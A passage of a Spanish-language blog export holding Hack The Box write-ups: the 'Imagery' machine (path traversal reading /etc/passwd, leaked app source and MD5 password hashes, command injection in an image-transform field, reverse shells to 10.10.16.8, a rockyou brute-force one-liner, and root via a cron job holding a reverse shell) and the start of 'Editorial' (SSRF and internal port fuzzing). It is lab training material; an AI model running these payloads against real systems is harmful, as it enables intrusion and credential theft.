exito..eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aPwk2Q.rf7KI0Y79__1S5ABZshZnMkv3H8Tenemos el token de Admin, lo que queda es remplazarlo por la nuestra y secuestrarloLFI (Local File Inclusion)Este es el Panel de administracion, todos los reportes pasan por aca.A simple vista logramos visualizar que podemos descargar un log del usuario admin y otro del usuario testuser@imagery.htb, para ovservar mejor la descarga de ese archivo lo interceptamos con BurpsuiteEs un archivo que muestra los logs de inicio de sesion del Administrador, supongo que es lo mismo para el usuario testuser.Lo primero que se me ocurre testear a la hora de ver archivos que se pueden descargar es:../../../../../etc/passwd o ..%2f..%2f..%2f..%2f..%2fetc%2fpasswdLos archivos que se descargan de un servidor los toma de alguna carpeta y esto hace que se desencadene un Path Traversal o LFI, se puede URLencodear para Bypassear alguna RestriccionTenemos un LFI valido, logramos ver el /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin_apt:x:42:65534::/nonexistent:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologinusbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologinmessagebus:x:102:102::/nonexistent:/usr/sbin/nologinsystemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologinpollinate:x:103:1::/var/cache/pollinate:/bin/falsepolkitd:x:991:991:User for polkitd:/:/usr/sbin/nologinsyslog:x:104:104::/nonexistent:/usr/sbin/nologinuuidd:x:105:105::/run/uuidd:/usr/sbin/nologintcpdump:x:106:107::/nonexistent:/usr/sbin/nologintss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/falselandscape:x:108:109::/var/lib/landscape:/usr/sbin/nologinfwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologinweb:x:1001:1001::/home/web:/bin/bashsshd:x:109:65534::/run/sshd:/usr/sbin/nologinsnapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/falsesnap_daemon:x:584788:584788::/nonexistent:/usr/bin/falsemark:x:1002:1002::/home/mark:/bin/bash_laurel:x:101:988::/var/log/laurel:/bin/falsedhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/falseEl archivo /proc/self/environ nos va a mostrar las variables de entorno que estan colocadas a nivel de sistema, pero no vemos nada relevante.Es importante ir jugando con el Path Traversal ir probando de ../ a ../../ o ../../../Una aplicacion que esta escrita en el lenguaje de Python va a tener un app.py, config.py, api.py, settings.py, routes.py…. etc, esto solo es una supocicion no digo que todas las apps lo tengan.from flask import Flask, render_templateimport osimport sysfrom datetime import datetimefrom config import *from utils import _load_data, _save_datafrom utils import *from api_auth import bp_authfrom api_upload import bp_uploadfrom api_manage import bp_managefrom api_edit import bp_editfrom api_admin import bp_adminfrom api_misc import bp_miscapp_core = Flask(__name__)app_core.secret_key = os.urandom(24).hex()app_core.config['SESSION_COOKIE_HTTPONLY'] = Falseapp_core.register_blueprint(bp_auth)app_core.register_blueprint(bp_upload)app_core.register_blueprint(bp_manage)app_core.register_blueprint(bp_edit)app_core.register_blueprint(bp_admin)app_core.register_blueprint(bp_misc)@app_core.route('/')def main_dashboard():    return render_template('index.html')if __name__ == '__main__':    current_database_data = _load_data()    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}    for collection_to_add in default_collections:        if collection_to_add not in existing_collection_names_in_database:            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})    _save_data(current_database_data)    for user_entry in current_database_data.get('users', []):        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f\"{user_entry['username']}.log\")        if not os.path.exists(user_log_file_path):            with open(user_log_file_path, 'w') as f:                f.write(f\"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\\n\")    port = int(os.environ.get(\"PORT\", 8000))    if port in BLOCKED_APP_PORTS:        print(f\"Port {port} is blocked for security reasons. Please choose another port.\")        sys.exit(1)    app_core.run(debug=False, host='0.0.0.0', port=port)config.pyimport osimport ipaddressDATA_STORE_PATH = 'db.json'UPLOAD_FOLDER = 'uploads'SYSTEM_LOG_FOLDER = 'system_logs'os.makedirs(UPLOAD_FOLDER, exist_ok=True)os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)MAX_LOGIN_ATTEMPTS = 10ACCOUNT_LOCKOUT_DURATION_MINS = 1ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}ALLOWED_UPLOAD_MIME_TYPES = {    'image/jpeg',    'image/png',    'image/gif',    'image/bmp',    'image/tiff',    'application/pdf'}ALLOWED_TRANSFORM_MIME_TYPES = {    'image/jpeg',    'image/png',    'image/gif',    'image/bmp',    'image/tiff'}MAX_FILE_SIZE_MB = 1MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}PRIVATE_IP_RANGES = [    ipaddress.ip_network('127.0.0.0/8'),    ipaddress.ip_network('172.0.0.0/12'),    ipaddress.ip_network('10.0.0.0/8'),    ipaddress.ip_network('169.254.0.0/16')]AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'EXIFTOOL_PATH = '/usr/bin/exiftool'En config.py al principio del script vemos que esta cargando un db.json, quizas se trate de alguna base de datosdb.json{    \"users\": [        {            \"username\": \"admin@imagery.htb\",            \"password\": \"5d9c1d507a3f76af1e5c97a3ad1eaa31\",            \"isAdmin\": true,            \"displayId\": \"a1b2c3d4\",            \"login_attempts\": 0,            \"isTestuser\": false,            \"failed_login_attempts\": 0,            \"locked_until\": null        },        {            \"username\": \"testuser@imagery.htb\",            \"password\": \"2c65c8d7bfbca32a3ed42596192384f6\",            \"isAdmin\": false,            \"displayId\": \"e5f6g7h8\",            \"login_attempts\": 0,            \"isTestuser\": true,            \"failed_login_attempts\": 0,            \"locked_until\": null        }    ],    \"images\": [],    \"image_collections\": [        {            \"name\": \"My Images\"        },        {            \"name\": \"Unsorted\"        },        {            \"name\": \"Converted\"        },        {            \"name\": \"Transformed\"        }    ],    \"bug_reports\": []}En db.json encontramos hashes que al parecer son md5, un algoritmo de cifrado extremadamente débil. Vamos a intentar crackearlo con crackstation via webSolo pudimos crackear el hash del usuario testuser, este lo vimos en el panel de admin. Quiero hacerme la idea que el puede tener alguna funcionalidad extra para la subida y edicion de imagenes.Vamos a iniciar sesion como testuserAparece un boton nuevo Manage Groups.Si subimos una imagen como lo hicimos anteriormente, se nos desbloquean mas funcionalidades como el procesamiento de imagenesInyeccion de Comandos (Command Injection)  Edit Details          Solo modifica la descripcion y nombre de la imagen        Convert Format          Puede convertir el formato de imagen a jpg, bmp, gif, pdf, etc.        Transform Image          Vale la pena probarlo, ya que puede recortar , ajustar el color y rotar la imagen. Como por ejemplo se puede modificar el tamaño de la imagen.      Si nos detenemos un poco en esta parte para recordar todo lo que obtuvimos hasta ahora, reuniendo la informacion observamos que en config.py hay una parte del script que nombra ImageMagick, este es una herramienta de edicion de imagenes del lado de backend.Lo siguiente seria interceptar la peticion cuando realizamos una accion en Transform Image.Aqui se puede probar muchas cosas, creanme que probe de todo. Pero en uno de los parametros como x se puede ejecutar comandos de la siguiente manera:\"x\":\"0; bash -c 'ping -c 1 10.10.16.8' #\"Recibiendo con exito el ping y comando que ejecutamos en la maquina. Solo queda ganar acceso al sistema con alguna reverse shell.En la web se crea un apartado con la imagen que editamos (Transformed)bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1'Estamos dentro!!!!!! Conseguimos una shell!!!!Escalada de PrivilegiosShell como WebEnumerando primero las tareas cron o tareas programadas que se ejecutan a nivel de sistema en intervalos regulares de tiempo, nos encontramos con esto:web@Imagery:~/web$ crontab -l# Edit this file to introduce tasks to be run by cron.# # Each task to run has to be defined through a single line# indicating with different fields when the task will be run# and what command to run for the task# # To define the time you can provide concrete values for# minute (m), hour (h), day of month (dom), month (mon),# and day of week (dow) or use '*' in these fields (for 'any').# # Notice that tasks will be started based on the cron's system# daemon's notion of time and timezones.# # Output of the crontab jobs (including errors) is sent through# email to the user the crontab file belongs to (unless redirected).# # For example, you can run a backup of all your user accounts# at 5 a.m every week with:# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/# # For more information see the manual pages of crontab(5) and cron(8)# # m h  dom mon dow   command* * * * * python3 /home/web/web/bot/admin.pyExiste una tarea 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ que esta deshabilitada pero quizas haya generado copias de seguridad en su tiempo.En la carpeta /var/backups nos encontramos con mucha informacion que almacena linux de manera regular. Pero cuando nos dirijiamos a dicha carpeta, en el camino nos encontramos conweb@Imagery:/var$ ls -ltotal 48drwxr-xr-x  2 root root   4096 Sep 22 18:56 backupdrwxr-xr-x  3 root root   4096 Sep 23 16:27 backupsdrwxr-xr-x 17 root root   4096 Sep 22 18:56 cachedrwxrwsrwt  2 root root   4096 Sep 22 18:56 crashdrwxr-xr-x 45 root root   4096 Sep 22 19:11 libdrwxrwsr-x  2 root staff  4096 Sep 22 18:56 locallrwxrwxrwx  1 root root      9 Oct  7  2024 lock -&gt; /run/lockdrwxrwxr-x  8 root syslog 4096 Oct 27 12:56 logdrwxrwsr-x  2 root mail   4096 Sep 22 18:56 maildrwxr-xr-x  2 root root   4096 Sep 22 18:56 optlrwxrwxrwx  1 root root      4 Oct  7  2024 run -&gt; /rundrwxr-xr-x  8 root root   4096 Sep 22 18:56 snapdrwxr-xr-x  4 root root   4096 Sep 22 18:56 spooldrwxrwxrwt  9 root root   4096 Oct 27 13:09 tmpweb@Imagery:/var$ iduid=1001(web) gid=1001(web) groups=1001(web)web@Imagery:/var$ cd backupweb@Imagery:/var/backup$ ls -ltotal 22516-rw-rw-r-- 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aesUn archivo zip.aes, a simple viste tiene pinta de que vamos a luchar con descifrarlo.Como primera medida vamos a traerlo a nuestra maquina para tratar de abrirlo  ZIP.AES          web_20250806_120723.zip.aes      Para desencriptar este archivo vamos a tener que instalar pyAesCryptEste oneliner va a probar diferentes combinaciones que toma del diccionario rockyou.txt.while IFS= read -r p; do pyAesCrypt -d web_20250806_120723.zip.aes -o /tmp/out.zip -p \"$p\" &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo \"[+] Password: $p\" &amp;&amp; mv /tmp/out.zip web_20250806_120723.zip.aes &amp;&amp; break; done &lt; /usr/share/wordlists/rockyou.txt[+] Password: bestfriendsEsta es la contraseña para abrir el archivo, este zip no se abre de una manera normal como haciendo un unzip. Se descomprime pasandole alguno de los scripts que tiene el pyAesCrypt❯ pwd/home/mrincreible/HTB/imagery/decrypt/web_zip/web❯ ls -ldrwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:21 2025  __pycache__drwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:22 2025  envdrwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:21 2025  system_logsdrwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:21 2025  templates.rw-rw-r-- root root 9.6 KB Tue Aug  5 08:56:42 2025  api_admin.py.rw-rw-r-- root root 6.2 KB Tue Aug  5 08:56:54 2025  api_auth.py.rw-rw-r-- root root  12 KB Tue Aug  5 08:57:06 2025  api_edit.py.rw-rw-r-- root root 8.9 KB Tue Aug  5 08:57:20 2025  api_manage.py.rw-rw-r-- root root 840 B  Tue Aug  5 08:58:18 2025  api_misc.py.rw-rw-r-- root root  12 KB Tue Aug  5 08:58:38 2025  api_upload.py.rw-rw-r-- root root 1.9 KB Tue Aug  5 15:21:24 2025  app.py.rw-rw-r-- root root 1.8 KB Tue Aug  5 08:59:48 2025  config.py.rw-rw-r-- root root 1.5 KB Wed Aug  6 12:07:02 2025  db.json.rw-rw-r-- root root 3.9 KB Tue Aug  5 09:00:20 2025  utils.pyEste archivo contiene un backup del proyecto que corre por el puerto 8000, es decir la aplicacion web que logramos vulnerar con un Command InjectionEn db.json existen otros usuarios que no conocemos, pero si estan a nivel de sistema linux.{    \"users\": [        {            \"username\": \"admin@imagery.htb\",            \"password\": \"5d9c1d507a3f76af1e5c97a3ad1eaa31\",            \"displayId\": \"f8p10uw0\",            \"isTestuser\": false,            \"isAdmin\": true,            \"failed_login_attempts\": 0,            \"locked_until\": null        },        {            \"username\": \"testuser@imagery.htb\",            \"password\": \"2c65c8d7bfbca32a3ed42596192384f6\",            \"displayId\": \"8utz23o5\",            \"isTestuser\": true,            \"isAdmin\": false,            \"failed_login_attempts\": 0,            \"locked_until\": null        },        {            \"username\": \"mark@imagery.htb\",            \"password\": \"01c3d2e5bdaf6134cec0a367cf53e535\",            \"displayId\": \"868facaf\",            \"isAdmin\": false,            \"failed_login_attempts\": 0,            \"locked_until\": null,            \"isTestuser\": false        },        {            \"username\": \"web@imagery.htb\",            \"password\": \"84e3c804cf1fa14306f26f9f3da177e0\",            \"displayId\": \"7be291d4\",            \"isAdmin\": true,            \"failed_login_attempts\": 0,            \"locked_until\": null,            \"isTestuser\": false        }    ],    \"images\": [],    \"bug_reports\": [],    \"image_collections\": [        {            \"name\": \"My Images\"        },        {            \"name\": \"Unsorted\"        },        {            \"name\": \"Converted\"        },        {            \"name\": \"Transformed\"        }    ]}Shell como markEsta contraseña es de mark, nos sirve para pivotear a este usuario y seguir enumerando para conseguir el rootmark@Imagery:~$ ls -ltotal 4-rw-r----- 1 root mark 33 Oct 27 12:17 user.txtmark@Imagery:~$ cat user.txt db6acff4c693ac960b8bd818e411ea1eSUDOmark@Imagery:~$ sudo -lMatching Defaults entries for mark on Imagery:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser mark may run the following commands on Imagery:    (ALL) NOPASSWD: /usr/local/bin/charcolPodemos ejecutar como root esta herramienta, vamos a ver como funciona.mark@Imagery:~$ sudo /usr/local/bin/charcol -husage: charcol.py [--quiet] [-R] {shell,help} ...Charcol: A CLI tool to create encrypted backup zip files.positional arguments:  {shell,help}          Available commands    shell               Enter an interactive Charcol shell.    help                Show help message for Charcol or a specific command.options:  --quiet               Suppress all informational output, showing only warnings and errors.  -R, --reset-password-to-default                        Reset application password to default (requires system password verification).Podemos conseguir una shell pero en la herramientamark@Imagery:~$ sudo /usr/local/bin/charcol shell  ░██████  ░██                                                  ░██  ░██   ░░██ ░██                                                  ░██ ░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ ░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ ░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██  ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██   ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██                                                                                                                                                                                                             Charcol The Backup Suit - Development edition 1.0.0[2025-10-27 15:44:54] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.charcol&gt; helpcharcol&gt; help[2025-10-27 15:44:59] [INFO] Charcol Shell Commands:  Backup &amp; Fetch:    backup -i &lt;paths...&gt; [-o &lt;output_file&gt;] [-p &lt;file_password&gt;] [-c &lt;level&gt;] [--type &lt;archive_type&gt;] [-e &lt;patterns...&gt;] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]      Purpose: Create an encrypted backup archive from specified files/directories.      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/'.      Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base.      Permissions: Files created with 664 permissions. Ownership is user:group.      Encryption:        - If '--app-password' is set (status 1) and no '-p &lt;file_password&gt;' is given, uses the application password for encryption.        - If 'no password' mode is set (status 2) and no '-p &lt;file_password&gt;' is given, creates an UNENCRYPTED archive.      Examples:        - Encrypted with file-specific password:          backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p &lt;file_password&gt; --verbose --type tar.gz -c 9        - Encrypted with app password (if status 1):          backup -i /home/user/example_file.json        - Unencrypted (if status 2 and no -p):          backup -i /home/user/example_file.json        - No timestamp:          backup -i /home/user/example_file.json --no-timestamp    fetch &lt;url&gt; [-o &lt;output_file&gt;] [-p &lt;file_password&gt;] [-f] [--ask-password]      Purpose: Download a file from a URL, encrypt it, and save it.      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/fetched_file'.      Permissions: Files created with 664 permissions. Ownership is current user:group.      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.      Encryption:        - If '--app-password' is set (status 1) and no '-p &lt;file_password&gt;' is given, uses the application password for encryption.        - If 'no password' mode is set (status 2) and no '-p &lt;file_password&gt;' is given, creates an UNENCRYPTED file.      Examples:        - Encrypted:          fetch &lt;URL&gt; -o &lt;output_file_path&gt; -p &lt;file_password&gt; --force        - Unencrypted (if status 2 and no -p):          fetch &lt;URL&gt; -o &lt;output_file_path&gt;  Integrity &amp; Extraction:    list &lt;encrypted_file&gt; [-p &lt;file_password&gt;] [--ask-password]      Purpose: Decrypt and list contents of an encrypted Charcol archive.      Note: Requires the correct decryption password.      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.      Example:        list /var/backup/&lt;encrypted_file_name&gt;.zip.aes -p &lt;file_password&gt;    check &lt;encrypted_file&gt; [-p &lt;file_password&gt;] [--ask-password]      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.      Example:        check /var/backup/&lt;encrypted_file_name&gt;.tar.gz.aes -p &lt;file_password&gt;    extract &lt;encrypted_file&gt; &lt;output_directory&gt; [-p &lt;file_password&gt;] [--ask-password]      Purpose: Decrypt an encrypted Charcol archive and extract its contents.      Note: Requires the correct decryption password.      Example:        extract /var/backup/&lt;encrypted_file_name&gt;.zip.aes /tmp/restored_data -p &lt;file_password&gt;  Automated Jobs (Cron):    auto add --schedule \"&lt;cron_schedule&gt;\" --command \"&lt;shell_command&gt;\" --name \"&lt;job_name&gt;\" [--log-output &lt;log_file&gt;]      Purpose: Add a new automated cron job managed by Charcol.      Verification:        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.      Examples:        - Status 1 (encrypted app password), cron:          CHARCOL_NON_INTERACTIVE=true charcol --app-password &lt;app_password&gt; auto add \\          --schedule \"0 2 * * *\" --command \"charcol backup -i /home/user/docs -p &lt;file_password&gt;\" \\          --name \"Daily Docs Backup\" --log-output &lt;log_file_path&gt;        - Status 2 (no app password), cron, unencrypted backup:          CHARCOL_NON_INTERACTIVE=true charcol auto add \\          --schedule \"0 2 * * *\" --command \"charcol backup -i /home/user/docs\" \\          --name \"Daily Docs Backup\" --log-output &lt;log_file_path&gt;        - Status 2 (no app password), interactive:          auto add --schedule \"0 2 * * *\" --command \"charcol backup -i /home/user/docs\" \\          --name \"Daily Docs Backup\" --log-output &lt;log_file_path&gt;          (will prompt for system password)    auto list      Purpose: List all automated jobs managed by Charcol.      Example:        auto list    auto edit &lt;job_id&gt; [--schedule \"&lt;new_schedule&gt;\"] [--command \"&lt;new_command&gt;\"] [--name \"&lt;new_name&gt;\"] [--log-output &lt;new_log_file&gt;]      Purpose: Modify an existing Charcol-managed automated job.      Verification: Same as 'auto add'.      Example:        auto edit &lt;job_id&gt; --schedule \"30 4 * * *\" --name \"Updated Backup Job\"    auto delete &lt;job_id&gt;      Purpose: Remove an automated job managed by Charcol.      Verification: Same as 'auto add'.      Example:        auto delete &lt;job_id&gt;  Shell &amp; Help:    shell      Purpose: Enter this interactive Charcol shell.      Example:        shell    exit      Purpose: Exit the Charcol shell.      Example:        exit    clear      Purpose: Clear the interactive shell screen.      Example:        clear    help [command]      Purpose: Show help for Charcol or a specific command.      Example:        help backupGlobal Flags (apply to all commands unless overridden):  --app-password &lt;password&gt;    : Provide the Charcol *application password* directly. Required for 'auto' commands if status 1. Less secure than interactive prompt.  -p, \"--password\" &lt;password&gt;    : Provide the *file encryption/decryption password* directly. Overrides application password for file operations. Less secure than --ask-password.  -v, \"--verbose\"                : Enable verbose output.  --quiet                      : Suppress informational output (show only warnings and errors).  --log-file &lt;path&gt;            : Log all output to a specified file.  --dry-run                    : Simulate actions without actual file changes (for 'backup' and 'fetch').  --ask-password               : Prompt for the *file encryption/decryption password* securely. Overrides -p and application password for file operations.  --no-banner                   : Do not display the ASCII banner.  -R, \"--reset-password-to-default\"  : Reset application password to default (requires system password verification).Esta herramienta sirve para encriptar archivos como el que desciframos… zip.aes.Luego de leer y analizar el tutorial de esta herramienta, note que la Automated Jobs (Cron) permite correr –command para programar el comando de respaldo. En lugar del comando de respaldo, puedo agregar una “revershell” aquí.El comando es el siguiente, con –schedule para establecer el tiempo de ejecución del comando, –command el comando que se va a ejecutar y –name para nombrar este trabajo, finalmente agregue la IP de la maquina Kali y el puerto opcional.auto add --schedule \"* * * * *\" --command \"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1'\" --name \"test\"Este comando lo va a ejecutar cada minuto asi que tenemos tiempo para ponernos en escucha.charcol&gt; auto add --schedule \"* * * * *\" --command \"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1'\" --name \"test\"[2025-10-27 15:49:38] [INFO] System password verification required for this operation.Enter system password for user 'mark' to confirm: [2025-10-27 15:49:44] [INFO] System password verified successfully.[2025-10-27 15:49:44] [INFO] Auto job 'test' (ID: e2e5843e-2e6f-4add-9e4f-4a9993c573da) added successfully. The job will run according to schedule.[2025-10-27 15:49:44] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1'Eso seria todo por la maquina Imagery de Hack The Box. GRACIAS!!!!!!!"
  },
  
  {
    "title": "Editorial - Hack The Box",
    "url": "/posts/editorial/",
    "categories": "htb, linux",
    "tags": "Linux, Web, SSRF, Sudoers, API, Github, Gitpython, CVE",
    "date": "2025-10-21 00:00:00 +0000",
    





    
    "snippet": "Editorial es una máquina Linux de dificultad fácil que cuenta con una aplicación web de publicación vulnerable a Falsificación de Solicitud del Lado del Servidor (SSRF). Esta vulnerabilidad se apro...",
    "content": "Editorial es una máquina Linux de dificultad fácil que cuenta con una aplicación web de publicación vulnerable a Falsificación de Solicitud del Lado del Servidor (SSRF). Esta vulnerabilidad se aprovecha para acceder a una API interna en ejecución, que a su vez se utiliza para obtener credenciales que permiten el acceso SSH a la máquina. Al enumerar el sistema, se revela un repositorio Git que se utiliza para revelar las credenciales de un nuevo usuario. El usuario root se puede obtener explotando la CVE-2022-24439 y la configuración de sudo.ReconocimientoNmapEmpezamos con un escaneo de puertos inicial sobre la maquina victimanmap -p- --open -T4 -n -Pn &lt;IP&gt;PORTS-&gt; 22 SSH-&gt; 80 HTTPNmap Servicios de Puertospodemos ver con mas detalles a que servicio corresponde y las versiones del ssh y pagina web pasando el -sCV, puede ser que hasta nos diga el dominio de la webnmap -p22,80 -sCV 10.10.11.20PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://editorial.htb|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelnos aparece el dominio real de la maquina victima, vamos a incorporarlo en nuestro /etc/hosts, esto lo hacemos para que cuando vayamos al navegador web y pongamos http://editorial.htb/ nos resuelva bien el host y veamos bien la web.echo \"10.10.11.20 editorial.htb\" &gt;&gt; /etc/hostsWebEnumeracion Web FuzzYa estamos en la web, lo primero que vamos a realizar es un fuzzeo intenso de la pagina, en busca de endpoints o funcionalidades de la app, a simple vista parece una bibliotecawfuzz -c --hc=404 --hh=8562 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \"http://editorial.htb/FUZZ\"********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://editorial.htb/FUZZTotal requests: 220559ID           Response   Lines    Word       Chars       Payload 000000026:   200        71 L     232 W      2938 Ch     \"about\" 000000366:   200        209 L    537 W      7134 Ch     \"upload\"Wfuzz es una de las herramientas mas sofisticadas para estas tareas, --hc=404 le indicamos que no queremos ver paginas que resuelvan un error 404 y con --hh= le indicamos que no queremos ver paginas que tengan esta cantida de caracteresEsta es la web de upload, podemos publicar o subir un libro en formato archivo o tambien en formato url, vamos a realizar una prueba…. en el campo url voy a poner mi ip de esta maneraesperamos que nos llegue alguna peticion, si nos llega podemos hablar de una vulnerabilidad conocida como Falsificación de Solicitud del Lado del Servidor (Server Side Request Forgery)SSRFLas fallas de SSRF ocurren cuando una aplicación web está obteniendo un recurso remoto sin validar la URL proporcionada por el usuario. Permite que un atacante coaccione a la aplicación para que envíe una solicitud falsificada a un destino inesperado, incluso cuando está protegido por un firewall, VPN u otro tipo de lista de control de acceso a la red (ACL).Dado que las aplicaciones web modernas brindan a los usuarios finales funciones convenientes, la búsqueda de una URL se convierte en un escenario común. Como resultado, la incidencia de SSRF está aumentando. Además, la gravedad de SSRF es cada vez mayor debido a los servicios en la nube y la complejidad de las arquitecturas.Explotacion SSRFEntonces en lugar de poner otra vez nuestra ip podemos intentar llegar a ver el localhost y puertos abiertos que tenga la maquina victima, si existen restricciones? siempre hay formas de intentar bypassearlas.En esta parte vamos a abrir Burpsuite, esta herramienta es muy buena para hacking web y estas vulnerabilidades, nos permite camibar metodos, peticiones, ver como se tramitan, etc.Si volvemos a repetir la vulnerabilidad nos manda a una imagen que crea por detras, si la visitamos tenemos esto… parece una imagen por defecto que crea la maquina.El plan sera copiar toda nuestra peticion de burpsuite, guardarlo como peticion.req y fuzzear por los puertos internos de la maquina, es decir en ves de pasarle nuestra ip vamos a pasarle 127.0.0.1:FUZZ, la herramienta fuff va a fuzzear en esa parte que le indiques con la palabra FUZZHacemos un nano peticion.req y copiamos toda la peticion, no olviden cambiar la parte donde va la url 127.0.0.1:FUZZ, CTRL + O y guardar, CTRL + X para salir de nanolo que nos queda es conseguir una wordlists o diccionario de los puertos, recordemos que tenemos 65535 puertos en total… con el poder de bash vamos a fabricarnos un diccionario que contenga todos los puertosseq 1 65535 | tail -n 56553165532655336553465535seq 1 65535 &gt; ports.txtesto nos da un dicionario de todos los puertos que necesitamos pasarle a la herramienta wfuzzffuf -c -w ports.txt -request peticion.req -request-proto http -fs 61encontramos un puerto abierto internamente en la maquina victima, puerto 5000.. vamos a comprobarlo en burpsuite para ver que nos devuelve esta vez.parece que pasa un tiempo determinado y vuelve a refrescar la url que nos dieron, hay q ser rapidos y listar todolisto, podemos ver informacion relevante en esta parte…. vemos endpoints con mucha informacion, quiero observar esto desde mi terminal para apreciar la informacion de una mejor manera.curl -s -X GET 